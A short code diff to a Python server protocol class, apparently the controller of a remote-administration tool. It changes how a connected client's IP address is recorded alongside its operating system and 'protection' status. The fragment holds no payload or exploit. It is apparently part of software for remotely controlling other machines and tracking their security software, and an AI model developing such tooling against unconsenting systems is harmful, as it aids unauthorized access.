@@ -159,7 +159,7 @@ class ModeratServerProtocol(Protocol):
         elif mode == 'infoChecker' and clients.has_key(payload['key']):
             client_socket = clients[payload['key']]['socket']
             clients[payload['key']] = {
-                'ip_address':           self.transport.getHost().host,
+                'ip_address':           self.transport.getPeer().host,
                 'os_type':              payload['os_type'],
                 'os':                   payload['os'],
                 'protection':           payload['protection'],
